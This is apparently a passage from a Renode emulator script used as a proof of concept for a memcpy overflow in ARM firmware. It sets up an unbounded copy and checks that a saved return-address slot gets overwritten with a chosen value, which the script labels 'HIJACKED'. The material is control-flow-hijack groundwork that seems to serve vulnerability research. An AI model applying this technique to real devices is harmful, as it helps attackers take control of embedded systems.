sysbus WriteDoubleWord 0x2000F454 0x20006E01

# --- Pre-seed DEST saved-LR sentinel @dest+0x454 = 0x2000E454 = 0xCAFED00D ---
sysbus WriteDoubleWord 0x2000E454 0xCAFED00D

# --- Call contract: memcpy(dest=0x2000E000, src=0x2000F000, len=0x458) ---
sysbus.cpu SetRegister 0  0x2000E000
sysbus.cpu SetRegister 1  0x2000F000
sysbus.cpu SetRegister 2  0x00000458
sysbus.cpu SetRegister 13 0x2003FF00
sysbus.cpu SetRegister 14 0x08006001
sysbus.cpu PC 0x80B64A8

echo ">>> BEFORE: dest+0x454 saved-LR slot @0x2000E454 (expect 0xCAFED00D) ="
sysbus ReadDoubleWord 0x2000E454
echo ">>> BEFORE: dest[0] @0x2000E000 (expect 0x00000000) ="
sysbus ReadDoubleWord 0x2000E000

# --- Run the ~1112-byte copy (~4.7 insns/byte => ~5200 insns). Split into 4x Step 2000. ---
sysbus.cpu Step 2000
sysbus.cpu Step 2000
sysbus.cpu Step 2000
sysbus.cpu Step 2000

echo ">>> PC after stepping ="
sysbus.cpu PC
echo ">>> AFTER: dest[0] @0x2000E000 (expect 0xCCCCCCCC first src word) ="
sysbus ReadDoubleWord 0x2000E000
echo ">>> AFTER: dest+0x454 saved-LR slot @0x2000E454 (expect 0x20006E01 HIJACKED) ="
sysbus ReadDoubleWord 0x2000E454

# --- Corroborating short unbounded copy: dest2=0x2000A000, src2=0x2000B000, len=0x100.
#     Sentinel at dest2+0xFC proves unboundedness at a second distance. ---
sysbus WriteDoubleWord 0x2000B0FC 0xB16B00B5
sysbus WriteDoubleWord 0x2000A0FC 0xDEADBEEF
sysbus.cpu SetRegister 0  0x2000A000
sysbus.cpu SetRegister 1  0x2000B000
sysbus.cpu SetRegister 2  0x00000100
sysbus.cpu SetRegister 13 0x2003FF00
sysbus.cpu SetRegister 14 0x08006001
sysbus.cpu PC 0x80B64A8
echo ">>> BEFORE(short): dest2+0xFC @0x2000A0FC (expect 0xDEADBEEF) ="
sysbus ReadDoubleWord 0x2000A0FC
sysbus.cpu Step 1200
echo ">>> AFTER(short): dest2+0xFC @0x2000A0FC (expect 0xB16B00B5 HIJACKED) ="
sysbus ReadDoubleWord 0x2000A0FC
